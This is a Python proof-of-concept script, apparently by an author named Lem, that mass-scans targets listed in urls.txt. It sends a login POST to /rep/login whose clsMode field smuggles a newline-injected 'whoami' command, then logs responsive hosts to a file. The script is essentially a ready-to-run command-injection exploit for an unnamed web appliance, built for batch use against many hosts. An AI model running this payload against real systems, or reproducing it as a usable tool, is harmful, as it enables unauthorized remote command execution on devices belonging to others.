#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
# author : Lem  
import urllib.request  
import re  
import requests  
import io  
import sys  
  

def basic_setting():
    timeout_s=3 
    regex_match=r'-(.+?)\n' #自定义正则匹配规则，'身份验证-用户名或密码错误(剩余重试[4]次)|cluster_mode_othersnobody','API-CT_SYS_FAIL_LIST  # 191内部主键ID耗尽|cluster_mode_othersnobody'
    
    return timeout_s,regex_match


def readfiles(): #批量读取文件，文本格式为https://127.0.0.1:8080
    result = [] 
    with open(r'urls.txt' ,'r') as f:
        for line in f:
         result.append(line.strip().split(',')[0])  
        return result


def all_poc():  #自定义poc内容
    poc_url = "/rep/login"  
    poc_post_data = 'clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'  
    header = {'Cookie': 'UEDC_LOGIN_POLICY_VALUE=checked',
            'Content-Length':'122',
            'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'Accept': '*/*',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Sec-Ch-Ua-Platform': '"Windows"',
            #'Origin': 'https://218.64.83.166:85',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://1.1.1.1:85/rep/login',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'
          }
    return poc_url, poc_post_data,header  

  
def scan_urls_post():  
    poc_url, poc_post_data,header = all_poc()  
    result = readfiles()   
    timeout_s,regex_match = basic_setting()
    for url in result:  
        scan = str(url) + poc_url  
        print(scan)  
        try:  
            re_data = requests.post(scan,data=poc_post_data,timeout=timeout_s,headers=header,verify=False)  
            print(re_data.status_code)  
            if re_data.status_code == 200:  
                find_list = re.findall(regex_match, re_data.text)  
                print(find_list) 
                print(re_data.text) 
                with open('scan_out.txt', mode='a') as file_handle:  
                    a = scan + "-"+ str(find_list)  
                    file_handle.write(str(a) + "\n")  
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e))  

def scan_urls_get():  
    poc_url, _ ,header = all_poc() 
    result = readfiles()  
    timeout_s,regex_match = basic_setting()
  
    for url in result:  
        scan = str(url) + poc_url  
        print(scan)  
        try:  
            re_data = requests.get(scan,timeout=timeout_s,headers=header,verify=False)  
            print(re_data.status_code)  
            if re_data.status_code == 200:  
                find_list = re.findall(regex_match, re_data.text)  
                print(find_list)  
                with open('scan_out.txt', mode='a') as file_handle:  
                    a = scan + "-"+str(find_list)  
                    file_handle.write(str(a) + "\n")  
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e))  
  


  
if __name__ == '__main__':    
    #scan_urls_get()
    scan_urls_post()